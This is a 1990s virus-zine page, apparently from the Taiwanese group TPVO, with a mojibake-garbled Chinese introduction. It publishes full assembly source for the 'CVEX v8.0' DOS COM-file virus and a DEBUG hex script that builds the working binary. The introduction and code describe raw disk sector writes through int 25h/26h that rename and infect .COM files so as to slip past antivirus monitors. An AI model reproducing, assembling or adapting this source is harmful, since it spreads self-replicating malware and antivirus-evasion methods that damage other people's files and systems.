
                                                                     P.003

         TpVOtPVoTpvOTpVOtpVoTPvOTPVOtpVOTPvOtPVOtPVOtPvOTPvOTpVoTPVO
         PT                                                        OT
         VP     ¥x ÆW «Â ¤O ¯f ¬r ²Õ Â´   ¯f¬rÂø»x   ²Ä ‘C ´Á      TP
         oV                                                        PV
         TO                Ææ  CVEX v8.0 ¯f¬r  Ææ                  Vo
         pT                                                        OT
         VP                     by Zhuge Jin                       VP
         OV                                                        OV
         OVTPVoTpvOtPvoTPVOtPvoTpVotpvoTpVotpvOtPvoTpVOtpvOTPvOTpvOTP


        ==============================================================

            ¥Ñ©ó¥i¼¦ªº½Þ­ô¥h·í§L¤F¡A¦Ó¦¹¤å³¹¤S¨S¦³¥ô¦ó»¡©ú¡A©Ò¥H´N¥Ñ§Ú¨Ó
        ¥Nµ§Åo...
            ¦¹¬r¬O¥ý¨ú±o SFT ¤¤ offset 1Bh ªº¥Ø¿ýºÏ°Ï¸¹½X¡AµM«á§Q¥Î int
        25h/int 26h ¨Ó¹ïÀÉ®×ªº¥Ø¿ý°µ¦s¨ú°Ê§@¡A¦p¦¹¤@¨Ó... ¥i¥H¥ý§Q¥Î int
        25h/int 26h ¨Ó±NÀÉ®×ªº°ÆÀÉ¦W rename ¦¨«D°õ¦æÀÉ¦W¡A¦A¶}±Ò¦¹ÀÉ·P¬V
        ¤§¡AµM«áÃöÀÉ¡A³Ì«á¦A§Q¥Î int 25h/26h ±N°ÆÀÉ¦W rename ¦^¥h¡C¦p¦¹¤@
        ¨Ó... ¥i°k¹L¨º¨ÇÄê¨¾¬rµ{¦¡¡C

                                                        Dark Slayer
========================== Begin of CVEX8.asm ==========================
;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; CVEX v8.0 by Zhuge Jin at TPVO, 1995.
;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

        .286
        .MODEL TINY
        .CODE

        org 0100h

vir_start:
        cld
        xor si,si
        mov ds,ds:[si+2ch]
        mov cx,8000h
        xor bp,bp
get_name:
        lodsb
        cmp word ptr ds:[si],0000h
        jnz get_name
        lodsw
        lodsw
        mov di,OFFSET buffer
        mov cx,0100h
        repz movsb
        push cs
        pop ds

        mov dx,0b400h
        mov ah,0fh
        int 10h
        cmp al,07h
        jz scr_mono
        mov dx,0bc00h
scr_mono:
        mov word ptr ds:[disk_buff+02h],dx

        mov ah,4ah
        mov bx,OFFSET vir_end+10h
        add bx,ds:prg_size
        shr bx,04h
        int 21h

        mov ax,3d00h
        mov dx,OFFSET buffer
        int 21h
        jc run_prog
        xchg ax,bx
        push bx
        mov ax,1220h
        int 2fh
        xor bx,bx
        mov bl,es:[di]
        mov ax,1216h
        int 2fh
        pop bx
        mov al,es:[di+05h]
        and ax,00111111b
        push ax
        push word ptr es:[di+1bh]
        pop word ptr ds:[disk_io]
        push word ptr es:[di+1dh]
        pop word ptr ds:[disk_io+02h]
        mov ah,3eh
        int 21h
        pop ax
        mov ds:drv_no,ax
        mov bx,OFFSET disk_io
        mov cx,0ffffh
        int 25h
        add sp,0002h

        lds si,ds:[disk_buff]
        add si,(08h-20h)
        mov cx,0013h
search_com:
        add si,0020h
        cmp word ptr ds:[si],'OC'
        jnz search_com
        cmp byte ptr ds:[si+02h],'M'
        jnz search_com
        cmp bp,03h
        jae run_prog
        push ds
        push si
        push cx
        call infect
        pop cx
        pop si
        pop ds
        loop search_com
run_prog:
        push cs
        pop ds
        push cs
        pop es
        mov cx,ds:prg_size
        mov si,OFFSET vir_end
        mov di,0100h
        push di
        repz movsb
        ret

infect:
        mov word ptr ds:[si],'PT'
        mov byte ptr ds:[si+02h],'V'

        push ds

        push cs
        pop ds
        mov ax,ds:drv_no
        mov bx,OFFSET disk_io
        mov cx,0ffffh
        int 26h
        add sp,0002h

        mov di,si
        sub di,0008h
        mov si,OFFSET buffer
find_2eh:
        lodsb
        cmp al,'.'
        jnz find_2eh
        std
find_path:
        cmp si,OFFSET buffer-1
        jb got_it
        lodsb
        cmp al,'\'
        jnz find_path
got_it:
        cld
        lodsw

        pop ds

        push cs
        pop es
        xchg si,di
        mov word ptr ds:[si+08h],'OC'
        mov byte ptr ds:[si+08h+02h],'M'
        mov word ptr cs:tmp_si,si
        mov word ptr cs:[tmp_si+02h],ds
        mov cx,0008h
set_file_name:
        lodsb
        cmp al,' '
        jz set_ext_name
        stosb
        loop set_file_name
set_ext_name:
        mov ax,'T.'
        stosw
        mov ax,'VP'
        stosw
        mov al,00h
        stosb

        push cs
        pop ds
        mov ax,3d02h
        mov dx,OFFSET buffer
        int 21h
        jc infect_err
        push ax
        mov ah,48h
        mov bx,0f00h
        int 21h
        pop bx
        jc infect_not
        mov es,ax
        xor di,di
        mov si,0100h
        mov cx,OFFSET vir_end-0100h
        repz movsb
        mov ax,4202h
        xor cx,cx
        cwd
        int 21h
        push ax
        mov ax,4200h
        xor cx,cx
        int 21h
        pop cx
        push cx
        push es
        pop ds
        mov ah,3fh
        mov dx,di
        int 21h
        mov ax,4200h
        xor cx,cx
        cwd
        int 21h
        pop cx
        mov ds:[prg_size-0100h],cx
        cmp word ptr ds:[di],33fch
        jz has_infect
        mov ah,40h
        add cx,OFFSET vir_end-0100h
        int 21h
        push ds
        lds si,cs:[tmp_si]
        add word ptr ds:[si+1ch],OFFSET vir_end-0100h
        pop ds
        inc bp
has_infect:
        mov ah,49h
        int 21h
infect_not:
        mov ah,3eh
        int 21h

        push cs
        pop ds
        mov ax,ds:drv_no
        mov bx,OFFSET disk_io
        mov cx,0ffffh
        int 26h
        add sp,0002h
infect_err:
        ret

drv_no dw ?

disk_io dd ?
        dw 0002h
disk_buff dd ?

prg_size dw 0002h

tmp_si dd ?

buffer db 0100h dup (?)

vir_end:

        int 20h

        END vir_start
=========================== End of CVEX8.asm ===========================

n cvex8.com
e 0100 FC 33 F6 8E 5C 2C B9 00 80 33 ED AC 83 3C 00 75
e 0110 FA AD AD BF B1 02 B9 00 01 F3 A4 0E 1F BA 00 B4
e 0120 B4 0F CD 10 3C 07 74 03 BA 00 BC 89 16 A9 02 B4
e 0130 4A BB C1 03 03 1E AB 02 C1 EB 04 CD 21 B8 00 3D
e 0140 BA B1 02 CD 21 72 66 93 53 B8 20 12 CD 2F 33 DB
e 0150 26 8A 1D B8 16 12 CD 2F 5B 26 8A 45 05 25 3F 00
e 0160 50 26 FF 75 1B 8F 06 A1 02 26 FF 75 1D 8F 06 A3
e 0170 02 B4 3E CD 21 58 A3 9F 02 BB A1 02 B9 FF FF CD
e 0180 25 83 C4 02 C5 36 A7 02 83 C6 E8 B9 13 00 83 C6
e 0190 20 81 3C 43 4F 75 F7 80 7C 02 4D 75 F1 83 FD 03
e 01A0 73 0B 1E 56 51 E8 17 00 59 5E 1F E2 E1 0E 1F 0E
e 01B0 07 8B 0E AB 02 BE B1 03 BF 00 01 57 F3 A4 C3 C7
e 01C0 04 54 50 C6 44 02 56 1E 0E 1F A1 9F 02 BB A1 02
e 01D0 B9 FF FF CD 26 83 C4 02 8B FE 83 EF 08 BE B1 02
e 01E0 AC 3C 2E 75 FB FD 81 FE B0 02 72 05 AC 3C 5C 75
e 01F0 F5 FC AD 1F 0E 07 87 F7 C7 44 08 43 4F C6 44 0A
e 0200 4D 2E 89 36 AD 02 2E 8C 1E AF 02 B9 08 00 AC 3C
e 0210 20 74 03 AA E2 F8 B8 2E 54 AB B8 50 56 AB B0 00
e 0220 AA 0E 1F B8 02 3D BA B1 02 CD 21 72 71 50 B4 48
e 0230 BB 00 0F CD 21 5B 72 52 8E C0 33 FF BE 00 01 B9
e 0240 B1 02 F3 A4 B8 02 42 33 C9 99 CD 21 50 B8 00 42
e 0250 33 C9 CD 21 59 51 06 1F B4 3F 8B D7 CD 21 B8 00
e 0260 42 33 C9 99 CD 21 59 89 0E AB 01 81 3D FC 33 74
e 0270 15 B4 40 81 C1 B1 02 CD 21 1E 2E C5 36 AD 02 81
e 0280 44 1C B1 02 1F 45 B4 49 CD 21 B4 3E CD 21 0E 1F
e 0290 A1 9F 02 BB A1 02 B9 FF FF CD 26 83 C4 02 C3 00
e 02A0 00 00 00 00 00 02 00 00 00 00 00 02 00 00 00 00
e 02B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 02C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 02D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 02E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 02F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0300 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0310 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0320 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0330 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0340 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0350 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0360 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0370 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0380 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0390 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 03A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 03B0 00 CD 20
rcx
2B3
w
q
